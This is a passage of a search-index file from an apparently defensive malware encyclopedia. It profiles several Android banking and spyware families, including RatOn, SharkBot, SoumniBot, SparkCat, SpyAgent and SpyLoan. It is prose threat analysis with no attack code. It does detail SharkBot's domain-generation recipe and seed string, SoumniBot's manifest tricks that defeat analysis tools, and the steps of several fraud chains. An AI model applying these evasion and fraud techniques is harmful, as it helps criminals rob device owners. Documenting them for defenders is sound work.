TikTok 18+ Play Store pages"},{"location":"malware/families/raton/#origin-and-lineage","title":"Origin and Lineage","text":"<p>RatOn's development trajectory shows a clear evolution from a simple NFC relay tool to a multi-capability banking trojan. ThreatFabric's analysis documents this progression:</p> <p>The NFC relay technique at RatOn's core builds on research first published by ESET regarding NGate, a family that demonstrated the viability of relaying NFC payment card data from a victim's device to a mule operating at a physical POS terminal or ATM. RatOn took this concept and expanded it significantly by adding remote access, ATS for automated money transfers, and cryptocurrency wallet targeting.</p> <p>The evolution from a focused NFC relay tool to a full-featured RAT with ATS suggests active development by operators who recognized the limitations of a single-vector approach and systematically added complementary fraud capabilities.</p>"},{"location":"malware/families/raton/#distribution","title":"Distribution","text":"Vector Details Fake TikTok pages Fraudulent \"TikTok 18+\" pages mimicking Google Play Store listings Social engineering Lures designed to appeal to users seeking age-restricted content <p>ThreatFabric documented that RatOn is distributed through fake Play Store pages advertising a \"TikTok 18+\" application. The adult content lure is designed to override user caution about sideloading apps from outside the official store.</p>"},{"location":"malware/families/raton/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/raton/#core-features","title":"Core Features","text":"Capability Implementation NFC relay Clones payment card data from victim's device and relays it to mules at physical POS terminals ATS Automated money transfers targeting Czech banking app George Cesko Crypto wallet theft Seed phrase extraction via Accessibility Service from MetaMask, Trust Wallet, Blockchain.com, Phantom Remote access Full device control for manual fraud operations Accessibility abuse Used for both crypto seed extraction and ATS automation"},{"location":"malware/families/raton/#nfc-relay","title":"NFC Relay","text":"<p>The NFC relay capability is RatOn's foundational feature. The attack chain works as follows:</p> <ol> <li>The victim is socially engineered into placing their payment card against their NFC-enabled phone</li> <li>RatOn reads the NFC data from the payment card</li> <li>The captured card data is relayed in real-time to a mule's device</li> <li>The mule uses the relayed data at a physical POS terminal or ATM to make transactions or withdraw cash</li> </ol> <p>This attack turns the victim's device into a bridge between their physical payment card and a remote attacker. The technique was first documented in the wild with the NGate family, but RatOn is the first to combine it with additional fraud mechanisms.</p>"},{"location":"malware/families/raton/#automated-transfer-system-ats","title":"Automated Transfer System (ATS)","text":"<p>ThreatFabric confirmed that RatOn is the first family to combine NFC relay with ATS. The ATS component specifically targets George Cesko, the mobile banking application of Ceska sporitelna (Czech Savings Bank). ATS automates the process of initiating and confirming money transfers within the banking app without the victim's awareness, using the Accessibility Service to navigate the app, fill in transfer details, and approve transactions.</p>"},{"location":"malware/families/raton/#cryptocurrency-wallet-targeting","title":"Cryptocurrency Wallet Targeting","text":"<p>RatOn extracts seed phrases from cryptocurrency wallet applications through Accessibility Service monitoring:</p> Wallet Targeted Data MetaMask Seed phrase / recovery phrase Trust Wallet Seed phrase / recovery phrase Blockchain.com Seed phrase / recovery phrase Phantom Seed phrase / recovery phrase <p>The Accessibility Service monitors when a user navigates to seed phrase display screens within these wallet apps and captures the displayed text. This gives operators access to the victim's cryptocurrency holdings across any blockchain supported by the compromised wallet.</p>"},{"location":"malware/families/raton/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/raton/#multi-vector-fraud-architecture","title":"Multi-Vector Fraud Architecture","text":"<p>RatOn's significance lies in its combination of three distinct fraud techniques in a single package:</p> <ol> <li>NFC relay for physical card fraud at POS terminals and ATMs</li> <li>ATS for automated bank transfers through the victim's own banking app</li> <li>Crypto theft through seed phrase extraction for cryptocurrency wallet drainage</li> </ol> <p>This multi-vector approach gives operators flexibility to monetize compromised devices through whichever channel offers the highest return, whether that is cloning payment cards, automating bank transfers, or stealing cryptocurrency.</p>"},{"location":"malware/families/raton/#c2-communication","title":"C2 Communication","text":"<p>Specific C2 protocol details were not fully disclosed in ThreatFabric's initial publication. The C2 infrastructure supports real-time NFC data relay, which requires low-latency communication between the victim's device and the mule's device.</p>"},{"location":"malware/families/raton/#target-regions","title":"Target Regions","text":"Region Status Details Czech Republic Primary target Initial campaign, George Cesko banking app targeted Slovakia Expanding Secondary target region <p>ThreatFabric's report documents the Czech Republic as the initial target with expansion into Slovakia. The focus on George Cesko (the Czech Savings Bank app) for ATS confirms the geographic specificity of the current campaign.</p>"},{"location":"malware/families/raton/#notable-campaigns","title":"Notable Campaigns","text":"<p>July 2025: First RatOn samples observed in the wild, initially functioning as a basic NFC relay tool. Distribution begins through fake TikTok 18+ Play Store pages targeting Czech users.</p> <p>September 2025: ThreatFabric publishes their analysis, documenting RatOn's evolution from a simple NFC relay tool into a comprehensive RAT combining NFC relay, ATS targeting George Cesko, and crypto wallet seed phrase extraction. The family is confirmed as the first to combine NFC relay with ATS capabilities.</p>"},{"location":"malware/families/raton/#related-families","title":"Related Families","text":"<p>RatOn builds on the NFC relay concept pioneered by NGate, which ESET documented as the first Android malware performing NFC relay attacks in the wild. While NGate demonstrated the viability of the technique, RatOn represents its maturation by combining it with established banking trojan capabilities.</p> <p>Other families with ATS capabilities include Anatsa, which pioneered ATS fraud through Google Play distribution, and SharkBot, which combines ATS with DGA-based C2. The crypto wallet targeting overlaps with families like SparkCat and SpyAgent, though RatOn uses Accessibility Service monitoring rather than OCR for seed phrase capture.</p> <p>The combination of physical-world fraud (NFC relay at POS terminals) with digital fraud (ATS bank transfers and crypto theft) represents a convergence trend in mobile malware, where operators seek to maximize monetization by exploiting every available channel on a compromised device.</p>"},{"location":"malware/families/raton/#references","title":"References","text":""},{"location":"malware/families/sharkbot/","title":"SharkBot","text":"<p>SharkBot is an Android banking trojan combining ATS (Automated Transfer System) fraud with a Domain Generation Algorithm (DGA) for C2 resilience. Discovered in October 2021, it was built from scratch with no code overlap with existing families. Its on-device fraud capabilities, cookie-stealing mechanism, and persistent Google Play presence made it a significant player in the EU banking trojan landscape. The DGA implementation, unusual for Android malware at the time, set it apart from contemporaries.</p>"},{"location":"malware/families/sharkbot/#overview","title":"Overview","text":"Attribute Details First Seen October 2021 Status Active (2025, v1.63+) Type Banking trojan, ATS fraud Aliases None widely used Attribution Unknown, financially motivated Distribution Google Play Store droppers, direct download"},{"location":"malware/families/sharkbot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cleafy's Threat Intelligence team identified SharkBot at the end of October 2021 during monitoring of European banking fraud. Analysis confirmed it shared no codebase with Anatsa/TeaBot, Cerberus/Alien, Oscorp, FluBot, or any other known Android banking family.</p> <p>NCC Group and Fox-IT published joint analysis in March 2022, providing the first deep technical breakdown including DGA internals and C2 protocol details. Fox-IT's blog covered the same analysis with additional distribution context.</p> <p>The malware has been under continuous development, with major version bumps in 2022 (v2, new DGA) and 2025 (v1.63, improved stealth).</p>"},{"location":"malware/families/sharkbot/#distribution","title":"Distribution","text":"<p>SharkBot's operators use Google Play dropper apps disguised as antivirus tools, file managers, and cleaner utilities.</p> Date Dropper Disguise Installs Source Early 2022 Antivirus apps 15,000+ NCC Group/Fox-IT April 2022 Various utility apps (7 apps) Thousands The Hacker News September 2022 Antivirus, cleaner apps Thousands Fox-IT November 2022 File manager apps Thousands The Hacker News <p>The dropper approach evolved over time. Early versions required <code>REQUEST_INSTALL_PACKAGES</code> and used accessibility services to install the payload. Later versions adopted a direct-download approach: the dropper opens a fake Play Store page prompting the user to \"update\" the app, which is actually the SharkBot payload. This avoided the need for accessibility permissions at the dropper stage.</p>"},{"location":"malware/families/sharkbot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/sharkbot/#version-evolution","title":"Version Evolution","text":"Version Date Key Changes v1.x Oct 2021 ATS, overlay injection, SMS interception, keylogging, DGA (Base64) v2.x May 2022 Code refactor, new DGA (MD5), updated C2 protocol v2.25 Aug 2022 Cookie stealing added, auto-reply SMS removed v1.63 Feb 2025 Improved stealth and evasion"},{"location":"malware/families/sharkbot/#core-features","title":"Core Features","text":"Capability Implementation ATS fraud Accessibility service simulates touches/clicks to perform transfers Overlay injection WebView-based phishing triggered when target banking app opens Keylogging Accessibility event monitoring captures all text input SMS interception Reads and hides incoming SMS for 2FA bypass Cookie stealing Snatches session cookies during bank login via <code>logsCookie</code> command Push notification abuse Can auto-reply to push notifications DGA Fallback C2 resolution when hardcoded domains are taken down"},{"location":"malware/families/sharkbot/#cookie-stealing","title":"Cookie Stealing","text":"<p>Fox-IT documented the cookie-stealing feature introduced in v2.25 (August 2022). When the victim logs into their bank account, SharkBot intercepts the valid session cookie using the <code>logsCookie</code> command and exfiltrates it to C2. These cookies are valuable for account takeover because they contain session tokens and device fingerprinting parameters that bypass anti-fraud checks on subsequent logins.</p>"},{"location":"malware/families/sharkbot/#ats-implementation","title":"ATS Implementation","text":"<p>The ATS engine receives a list of events from C2 to simulate on the device in sequence. These events include:</p> <ul> <li>Touch/click simulation at specific coordinates</li> <li>Button press simulation</li> <li>Text input into fields</li> <li>App navigation steps</li> </ul> <p>This allows the operator to script full transfer workflows that execute autonomously on the victim's device.</p>"},{"location":"malware/families/sharkbot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/sharkbot/#dga-algorithm","title":"DGA Algorithm","text":"<p>SharkBot's DGA is its most distinctive technical feature. Detailed analysis of both DGA versions documents the evolution:</p> <p>Version 1 (Base64 DGA):</p> <ul> <li>Input: <code>{week_of_year}{year}{seed_string}</code></li> <li>Seed string: <code>pojBI9LHGFdfgegjjsJ99hvVGHVOjhksdf</code></li> <li>Encoding: Base64</li> <li>Output: first 19 characters of the encoded string</li> <li>TLD: appended from hardcoded list</li> </ul> <p>Version 2 (MD5 DGA):</p> <ul> <li>Input: same date/seed combination</li> <li>Encoding: MD5 hash</li> <li>Output: first 19 characters of the hex digest</li> <li>Improvement: eliminates the static Base64 suffix that made v1 domains predictable</li> </ul> <p>The DGA regenerates weekly, producing new domains that the operators pre-register.</p>"},{"location":"malware/families/sharkbot/#c2-communication","title":"C2 Communication","text":"Component Details Encryption RC4 with hardcoded key Encoding Base64 over encrypted payload Protocol HTTPS POST Fallback DGA-generated domains when primary C2 is down"},{"location":"malware/families/sharkbot/#anti-analysis","title":"Anti-Analysis","text":"Technique Details String obfuscation Custom routine across all versions Emulator detection Checks build properties and hardware identifiers DGA Makes C2 takedown difficult Low AV detection Minimal static signatures at time of discovery"},{"location":"malware/families/sharkbot/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"Period Targeted Countries Oct-Dec 2021 UK, Italy, US Early 2022 UK, Italy Aug 2022 Expanded to Spain, Australia, Poland, Germany, US, Austria <p>Fox-IT observed the target expansion in August 2022 when new C2 servers began serving target lists including banks beyond the original UK/Italy focus. Targeted institutions include traditional banks and cryptocurrency exchanges.</p>"},{"location":"malware/families/sharkbot/#notable-campaigns","title":"Notable Campaigns","text":"<p>October-November 2021: Cleafy's initial disclosure documented the first SharkBot botnet targeting UK, Italian, and US banking apps and cryptocurrency exchanges.</p> <p>March 2022: NCC Group and Fox-IT published detailed analysis of SharkBot distributed through Google Play as fake antivirus apps, with 15,000+ installs across the UK and Italy.</p> <p>April 2022: SharkBot resurfaced on Google Play behind seven new apps after the initial batch was removed.</p> <p>September 2022: Fox-IT documented SharkBot v2.25 with the new cookie-stealing capability and MD5-based DGA, distributed through fake antivirus and cleaner apps.</p> <p>November 2022: SharkBot appeared in file manager apps on Google Play, targeting users primarily in the UK, Italy, and expanded European markets.</p> <p>February 2025: Cyble documented SharkBot v1.63 with improved stealth capabilities, confirming the malware remains under active development.</p>"},{"location":"malware/families/sharkbot/#references","title":"References","text":""},{"location":"malware/families/soumnibot/","title":"SoumniBot","text":"<p>SoumniBot is a Korean banking trojan that exploits weaknesses in Android's manifest parsing to evade static analysis tools. Kaspersky published the analysis in April 2024, documenting three novel manifest obfuscation techniques that exploit differences between how build tools validate the AndroidManifest.xml and how the Android OS actually parses it. The malware steals SMS messages, contacts, banking certificates (NPKI), and photos from South Korean banking users.</p>"},{"location":"malware/families/soumnibot/#overview","title":"Overview","text":"Attribute Details First Seen 2024 Last Seen Active Status Active Type Banking trojan, credential stealer Attribution Unknown; targets South Korea exclusively Aliases None known"},{"location":"malware/families/soumnibot/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.SoumniBot AhnLab Trojan/Android.Banker.SoumniBot McAfee Android/Banker.SoumniBot"},{"location":"malware/families/soumnibot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>SoumniBot is independently developed with no known code lineage to other banking trojan families. Its significance lies not in its operational capabilities (which are standard for Korean banking trojans) but in its manifest obfuscation techniques, which represent a novel evasion category affecting static analysis tools including jadx, apktool, and the Android system's own manifest parser.</p> <p>The family operates in the same Korean banking threat space as Fakecalls and SpyAgent.</p>"},{"location":"malware/families/soumnibot/#distribution","title":"Distribution","text":"Vector Details Smishing SMS messages impersonating Korean banking services Fake banking apps APKs disguised as legitimate Korean banking applications Third-party stores Distribution through Korean third-party app repositories"},{"location":"malware/families/soumnibot/#capabilities","title":"Capabilities","text":"Capability Description SMS interception Reads and forwards SMS including banking OTPs Contact theft Exfiltrates full contact list NPKI certificate theft Steals Korean banking authentication certificates (NPKI digital certificates stored on device) Photo exfiltration Uploads photos from device storage Device info collection IMEI, phone number, operator, installed apps Manifest obfuscation Three novel techniques to evade static analysis"},{"location":"malware/families/soumnibot/#npki-certificate-theft","title":"NPKI Certificate Theft","text":"<p>South Korean banking relies heavily on NPKI (National Public Key Infrastructure) digital certificates stored locally on devices for transaction authentication. SoumniBot specifically targets these certificate files, which are typically stored in the device's <code>/NPKI/</code> directory. Stolen NPKI certificates combined with captured credentials enable unauthorized banking transactions.</p>"},{"location":"malware/families/soumnibot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/soumnibot/#manifest-obfuscation","title":"Manifest Obfuscation","text":"<p>The core technical innovation documented by Kaspersky:</p>"},{"location":"malware/families/soumnibot/#technique-1-invalid-compression-method","title":"Technique 1: Invalid Compression Method","text":"<p>The AndroidManifest.xml inside the APK (ZIP) uses an invalid compression method value in the ZIP entry header. Android's libziparchive defaults to uncompressed extraction when encountering an unknown method, but analysis tools that strictly validate compression methods fail to parse the manifest.</p>"},{"location":"malware/families/soumnibot/#technique-2-invalid-manifest-size","title":"Technique 2: Invalid Manifest Size","text":"<p>The manifest's declared size in the ZIP entry header does not match its actual size. Android's parser reads the file normally regardless, but tools that validate size consistency either crash or produce corrupt output.</p>"},{"location":"malware/families/soumnibot/#technique-3-long-namespace-names","title":"Technique 3: Long Namespace Names","text":"<p>XML namespace strings of excessive length (hundreds of thousands of characters) are inserted into the manifest. This causes analysis tools to allocate excessive memory when rendering the manifest, often leading to crashes or timeouts. Android's parser handles the long strings without issue.</p>"},{"location":"malware/families/soumnibot/#impact-on-analysis-tools","title":"Impact on Analysis Tools","text":"Tool Effect jadx Fails to parse manifest with invalid compression apktool Errors on size mismatch, produces incomplete output AAPT/AAPT2 Handles some techniques but struggles with long namespaces Android OS Parses all three techniques correctly, installs and runs the app <p>These techniques specifically target the gap between how analysis tools and the Android OS parse the same file. The malware is fully functional on devices but breaks standard reverse engineering workflows.</p>"},{"location":"malware/families/soumnibot/#c2-communication","title":"C2 Communication","text":"<ul> <li>HTTP-based C2</li> <li>Dynamic C2 server addresses retrieved from configuration</li> <li>Exfiltrated data (SMS, certificates, photos) uploaded via multipart HTTP POST</li> <li>Commands received via JSON polling</li> </ul>"},{"location":"malware/families/soumnibot/#target-regions","title":"Target Regions","text":"Region Details South Korea Exclusive target, Korean banking focus <p>SoumniBot targets major South Korean banks and financial institutions. The NPKI certificate theft specifically targets the Korean digital certificate infrastructure, which has no direct equivalent in other countries.</p>"},{"location":"malware/families/soumnibot/#notable-campaigns","title":"Notable Campaigns","text":"<p>2024, April: Kaspersky publishes SoumniBot analysis, documenting three novel manifest obfuscation techniques. Google is notified about the parser exploitation techniques. The research directly impacts the static analysis community by highlighting that standard tools may fail to parse deliberately malformed manifests.</p>"},{"location":"malware/families/soumnibot/#references","title":"References","text":""},{"location":"malware/families/sparkcat/","title":"SparkCat","text":"<p>SparkCat is the first documented malware family to use OCR (optical character recognition) to steal cryptocurrency wallet recovery phrases from device photos, and the first OCR-based stealer to infiltrate both Google Play and Apple's App Store. Kaspersky discovered SparkCat in February 2025, finding it active since at least March 2024 with 242,000+ downloads across both platforms. The malware uses Google ML Kit to scan gallery images for screenshots of cryptocurrency wallet seed phrases, then exfiltrates matching images to C2 servers using a Rust-based communication protocol. A follow-up variant, SparkKitty, was identified in mid-2025 targeting Southeast Asian and Chinese users through fake gambling and TikTok clone apps.</p>"},{"location":"malware/families/sparkcat/#overview","title":"Overview","text":"Attribute Details First Seen March 2024 Last Seen Active (SparkKitty variant, 2025) Status Active, new variants emerging Type Cryptocurrency stealer, OCR-based data exfiltration Attribution Unknown; C2 comments suggest Chinese-speaking developer Aliases SparkKitty (later variant)"},{"location":"malware/families/sparkcat/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan.AndroidOS.SparkCat McAfee Android/SparkCat ESET Android/Spy.SparkCat"},{"location":"malware/families/sparkcat/#origin-and-lineage","title":"Origin and Lineage","text":"<p>SparkCat is independently developed with no known code lineage to existing malware families. However, the OCR-based crypto theft technique has a parallel: McAfee documented the SpyAgent campaign in September 2024, which independently uses OCR to steal crypto seed phrases from device photos targeting Korean users. The two operations appear to be separate actors converging on the same technique, indicating OCR-based credential theft is an emerging threat pattern.</p> <p>SparkCat is cross-platform, operating on both Android and iOS. This is unusual for mobile malware families, which typically target a single platform.</p>"},{"location":"malware/families/sparkcat/#distribution","title":"Distribution","text":""},{"location":"malware/families/sparkcat/#google-play-and-app-store","title":"Google Play and App Store","text":"<p>SparkCat achieved presence on both major app stores simultaneously:</p> Platform App Types Downloads Google Play Food delivery, AI assistants, messaging apps 242,000+ combined Apple App Store Similar utility categories Unknown count <p>Some carrier apps appear to be legitimate applications compromised with a malicious SDK (supply chain attack), while others were purpose-built by the threat actor.</p>"},{"location":"malware/families/sparkcat/#sparkkitty-variant-2025","title":"SparkKitty Variant (2025)","text":"<p>Kaspersky documented the SparkKitty follow-up:</p> Distribution Details Fake gambling apps Targets Southeast Asian users TikTok clones Social media impersonation Social engineering Waits for user to open support chat, requests gallery access for \"screenshots\" <p>The SparkKitty variant uses a more targeted social engineering approach: it waits for the user to open an in-app support chat, then requests gallery access under the pretense of attaching screenshots. This provides a legitimate-seeming context for the gallery permission request.</p>"},{"location":"malware/families/sparkcat/#capabilities","title":"Capabilities","text":"Capability Description OCR scanning Uses Google ML Kit to scan gallery images for crypto seed phrases Multi-language OCR Recognizes seed phrases in English, Chinese, Japanese, Korean, and European languages Selective exfiltration Only uploads images containing detected seed phrase patterns Gallery monitoring Monitors photo gallery for new screenshots C2 communication Rust-based protocol for command and data transfer Cross-platform Operates on both Android and iOS"},{"location":"malware/families/sparkcat/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/sparkcat/#ocr-pipeline","title":"OCR Pipeline","text":"<p>The core theft mechanism uses Google ML Kit's on-device text recognition:</p> <ol> <li>Malware requests gallery/photo access (using social engineering context or at installation)</li> <li>Scans all images in the device gallery using ML Kit OCR</li> <li>Applies keyword matching against a dictionary of seed phrase-related terms (BIP-39 wordlist patterns, \"recovery phrase,\" \"seed words,\" etc.)</li> <li>Images matching crypto wallet seed phrase patterns are uploaded to C2</li> <li>Monitoring continues for new images added to gallery</li> </ol> <p>The use of on-device ML Kit means OCR processing happens locally without sending all images to a remote server, reducing network footprint and making detection harder.</p>"},{"location":"malware/families/sparkcat/#rust-based-c2","title":"Rust-Based C2","text":"<p>SparkCat's C2 communication uses a custom protocol implemented in Rust, an unusual choice for Android malware:</p> <ul> <li>Binary protocol over HTTPS</li> <li>Rust native library handles serialization and encryption</li> <li>Complicates reverse engineering compared to standard Java/Kotlin HTTP clients</li> <li>C2 server infrastructure observed with Chinese-language comments in configuration</li> </ul>"},{"location":"malware/families/sparkcat/#keyword-matching","title":"Keyword Matching","text":"<p>The OCR results are matched against localized keyword dictionaries:</p> Language Target Keywords English \"recovery phrase,\" \"seed phrase,\" \"mnemonic,\" BIP-39 words Chinese Simplified and traditional crypto wallet terminology Japanese Japanese translations of wallet recovery terms Korean Korean crypto exchange terminology"},{"location":"malware/families/sparkcat/#permissions","title":"Permissions","text":"Permission Purpose READ_EXTERNAL_STORAGE Access device photo gallery for OCR scanning READ_MEDIA_IMAGES Access images on Android 13+ devices INTERNET C2 communication and image exfiltration"},{"location":"malware/families/sparkcat/#target-regions","title":"Target Regions","text":"Region Vector Southeast Asia Primary target, SparkKitty gambling app lures China Chinese-language OCR, TikTok clone apps Global Play Store/App Store distribution reaches worldwide"},{"location":"malware/families/sparkcat/#notable-campaigns","title":"Notable Campaigns","text":"<p>2024, March: SparkCat begins operating on Google Play and Apple App Store. Multiple apps with combined 242,000+ downloads carry the malicious SDK.</p> <p>2025, February: Kaspersky publishes SparkCat analysis, documenting the first OCR-based stealer on both major app stores. The research reveals Google ML Kit integration, Rust-based C2, and multi-language seed phrase detection.</p> <p>2025: SparkKitty variant emerges targeting Southeast Asian users through fake gambling games and TikTok clones. The variant refines social engineering by requesting gallery access during in-app support chat interactions.</p>"},{"location":"malware/families/sparkcat/#references","title":"References","text":"<ul> <li>Kaspersky - SparkCat stealer in App Store and Google Play (February 2025)</li> <li>Kaspersky - SparkKitty iOS and Android malware (2025)</li> <li>McAfee - SpyAgent campaign steals crypto credentials via image recognition (September 2024)</li> </ul>"},{"location":"malware/families/spyagent/","title":"SpyAgent","text":"<p>SpyAgent is an Android spyware campaign using OCR (optical character recognition) to steal cryptocurrency wallet recovery phrases from device photos. McAfee discovered the campaign in September 2024, identifying 280+ fake apps targeting Korean users since January 2024. The apps impersonate banking, government, streaming, and utility applications to gain gallery access, then scan stored photos for screenshots containing cryptocurrency mnemonic seed phrases. McAfee's investigation also revealed misconfigured attacker infrastructure, exposing admin panels, stolen data, and operational details.</p>"},{"location":"malware/families/spyagent/#overview","title":"Overview","text":"Attribute Details First Seen January 2024 Last Seen Active Status Active, expanding Type Cryptocurrency stealer, spyware Attribution Unknown; infrastructure suggests organized operation Aliases None known"},{"location":"malware/families/spyagent/#vendor-names","title":"Vendor Names","text":"Vendor Name McAfee Android/SpyAgent Kaspersky HEUR:Trojan-Spy.AndroidOS.SpyAgent AhnLab Trojan/Android.SpyAgent"},{"location":"malware/families/spyagent/#origin-and-lineage","title":"Origin and Lineage","text":"<p>SpyAgent is independently developed. The OCR-based crypto theft technique is shared with SparkCat, which Kaspersky documented targeting a broader audience via Google Play and App Store. The two operations appear to be separate actors who independently converged on the same attack technique. SpyAgent focuses narrowly on Korean users through sideloaded apps, while SparkCat uses supply chain distribution via official stores.</p>"},{"location":"malware/families/spyagent/#distribution","title":"Distribution","text":"<p>SpyAgent distributes through phishing SMS and social media, directing users to fake download pages:</p> Vector Details Smishing SMS with links to fake app download pages Social media Phishing links on Korean social platforms Fake websites Landing pages impersonating legitimate services"},{"location":"malware/families/spyagent/#app-impersonation","title":"App Impersonation","text":"<p>280+ fake apps identified, impersonating:</p> Category Examples Banking Korean bank apps, financial calculators Government Korean government service apps Streaming Media and entertainment apps Utilities Photo editors, storage managers, delivery tracking <p>All apps are distributed through sideloading (APK download from fake websites), not through Google Play.</p>"},{"location":"malware/families/spyagent/#capabilities","title":"Capabilities","text":"Capability Description OCR scanning Scans device gallery photos for crypto seed phrases Photo exfiltration Uploads photos containing detected seed phrases SMS interception Reads and forwards SMS including OTPs Contact theft Exfiltrates contact list Device info Hardware identifiers, installed apps Gallery monitoring Watches for new screenshots added to gallery"},{"location":"malware/families/spyagent/#ocr-crypto-theft","title":"OCR Crypto Theft","text":"<p>The core theft mechanism:</p> <ol> <li>App requests storage/media permissions during installation</li> <li>Scans all images in device gallery using on-device OCR</li> <li>Applies pattern matching against BIP-39 seed phrase word patterns</li> <li>Images matching seed phrase patterns are uploaded to C2</li> <li>Continues monitoring gallery for new screenshots</li> </ol> <p>Users commonly screenshot their wallet recovery phrases during initial crypto wallet setup. SpyAgent targets these screenshots to extract the 12-24 word recovery phrases that provide full access to cryptocurrency wallets.</p>"},{"location":"malware/families/spyagent/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/spyagent/#ocr-implementation","title":"OCR Implementation","text":"<p>SpyAgent uses on-device text recognition to process gallery images:</p> <ul> <li>Processes images locally on the device</li> <li>Keyword matching against common seed phrase patterns and BIP-39 wordlist</li> <li>Selective upload (only matching images, not entire gallery)</li> <li>Multiple OCR passes for different image orientations and text sizes</li> </ul>"},{"location":"malware/families/spyagent/#exposed-infrastructure","title":"Exposed Infrastructure","text":"<p>McAfee discovered misconfigured attacker servers with exposed admin panels revealing:</p> Exposed Data Details Admin panels Web interfaces for managing stolen data Victim databases Stolen SMS, contacts, and photos from compromised devices Configuration files Server-side logic for processing OCR results Statistics Infection counts and data collection metrics <p>The exposed infrastructure provided unusual visibility into the operation's scale and methodology. The admin panels showed organized data management, suggesting a structured criminal operation rather than opportunistic individual actors.</p>"},{"location":"malware/families/spyagent/#c2-communication","title":"C2 Communication","text":"<ul> <li>HTTP-based communication</li> <li>Stolen data uploaded via multipart POST requests</li> <li>Server-side processing of uploaded images with additional OCR verification</li> <li>Simple command structure for app configuration and data exfiltration parameters</li> </ul>"},{"location":"malware/families/spyagent/#target-regions","title":"Target Regions","text":"Region Details South Korea Primary and near-exclusive target <p>The campaign targets Korean cryptocurrency holders specifically. All fake apps use Korean language, impersonate Korean services, and are distributed through Korean-language phishing channels.</p>"},{"location":"malware/families/spyagent/#notable-campaigns","title":"Notable Campaigns","text":"<p>2024, January: SpyAgent campaign begins deploying fake apps targeting Korean users. 280+ unique app variants identified over the campaign's lifetime.</p> <p>2024, September: McAfee publishes SpyAgent analysis, documenting the OCR-based seed phrase theft, 280+ fake apps, and exposed attacker infrastructure. The research reveals the operational scale and confirms crypto wallet theft as the primary objective.</p>"},{"location":"malware/families/spyagent/#references","title":"References","text":""},{"location":"malware/families/spyloan/","title":"SpyLoan","text":"<p>SpyLoan is a class of predatory loan applications that function as spyware, collecting excessive personal data for harassment and extortion of borrowers. McAfee documented the global threat in November 2024, identifying 15 apps with 8 million+ combined installs on Google Play and a 75% increase in SpyLoan infections between Q2 and Q3 2024. ESET published earlier research documenting the phenomenon across Latin America and Southeast Asia. SpyLoan represents a distinct threat category: the apps are not traditional trojans stealing banking credentials but rather predatory financial tools that weaponize harvested personal data against their own users.</p>"},{"location":"malware/families/spyloan/#overview","title":"Overview","text":"Attribute Details First Seen 2020 (growing trend) Last Seen Active (increasing volume) Status Active, expanding globally Type Predatory loan app, spyware, extortionware Attribution Multiple independent operators, often linked to unlicensed fintech companies Aliases Loan Shark apps, Predatory Lending Malware"},{"location":"malware/families/spyloan/#vendor-names","title":"Vendor Names","text":"Vendor Name McAfee Android/SpyLoan ESET Android/SpyLoan Kaspersky HEUR:Trojan.AndroidOS.SpyLoan Bitdefender Android.Trojan.SpyLoan"},{"location":"malware/families/spyloan/#origin-and-lineage","title":"Origin and Lineage","text":"<p>SpyLoan is not a single malware family but a category of predatory apps from multiple independent operators. The apps share common characteristics: they offer quick personal loans through seemingly legitimate financial apps on Google Play, then use the excessive permissions and collected data to harass borrowers into repaying at extortionate interest rates. The operators are frequently linked to unlicensed fintech companies operating from China, India, and Southeast Asia.</p> <p>Unlike banking trojans that steal credentials covertly, SpyLoan apps collect data openly through permission requests that appear reasonable for a \"financial app\" (contacts for \"references,\" camera for \"ID verification,\" location for \"credit scoring\"). The data is then weaponized if the borrower fails to repay or disputes terms.</p>"},{"location":"malware/families/spyloan/#distribution","title":"Distribution","text":"Vector Details Google Play Primary distribution, apps pass review as legitimate loan platforms Third-party stores Additional distribution through regional app stores Social media ads Facebook, Instagram, and TikTok advertisements targeting users needing quick loans <p>SpyLoan apps achieve high install counts because they present as legitimate financial services and target users in genuine financial need. The apps typically offer instant approval for personal loans with minimal documentation.</p>"},{"location":"malware/families/spyloan/#capabilities","title":"Capabilities","text":"Capability Description Contact harvesting Uploads full contact list for harassment of borrower's social circle SMS access Reads all SMS messages, extracts financial information Call log theft Exfiltrates call history Photo/media access Accesses device photos, potentially used for extortion Camera access Captures selfies during \"identity verification,\" stored for intimidation Location tracking GPS tracking of borrowers Device info IMEI, installed apps, account information Notification access Monitors financial notifications"},{"location":"malware/families/spyloan/#extortion-model","title":"Extortion Model","text":"<p>The data collection feeds a harassment and extortion operation:</p> <ol> <li>User downloads app and applies for a loan</li> <li>App collects contacts, photos, SMS, location during \"verification\"</li> <li>Loan is approved at predatory interest rates (often 100%+ APR)</li> <li>If borrower misses payment or disputes terms:<ul> <li>Contacts receive threatening messages claiming the borrower owes money</li> <li>Personal photos may be shared with contacts</li> <li>Threatening calls to borrower and their contacts</li> <li>Fake legal threats sent to borrower's workplace</li> </ul> </li> </ol> <p>This model has caused documented cases of suicide in India and other countries, leading to regulatory action in multiple jurisdictions.</p>"},{"location":"malware/families/spyloan/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/spyloan/#permission-abuse","title":"Permission Abuse","text":"<p>SpyLoan apps request permissions under the guise of financial verification:</p> Permission Stated Reason Actual Use READ_CONTACTS \"Loan references\" Harassment contact list READ_SMS \"Income verification\" Financial data mining CAMERA \"ID photo verification\" Intimidation material ACCESS_FINE_LOCATION \"Address verification\" Physical intimidation READ_CALL_LOG \"Employment verification\" Social network mapping READ_EXTERNAL_STORAGE \"Document upload\" Photo/document theft"},{"location":"malware/families/spyloan/#development-framework","title":"Development Framework","text":"<p>SpyLoan apps frequently use web-based cross-platform frameworks (Cordova/Ionic, React Native) for rapid iteration. The web-based architecture allows operators to quickly rebrand and redeploy loan interfaces across regions with minimal development effort. Some operators use native Android, particularly those with more sophisticated data collection capabilities.</p>"},{"location":"malware/families/spyloan/#data-exfiltration","title":"Data Exfiltration","text":"<ul> <li>All collected data uploaded to operator servers immediately upon permission grant</li> <li>Data retained even if the user never completes a loan application</li> <li>Server-side storage enables data use even after app 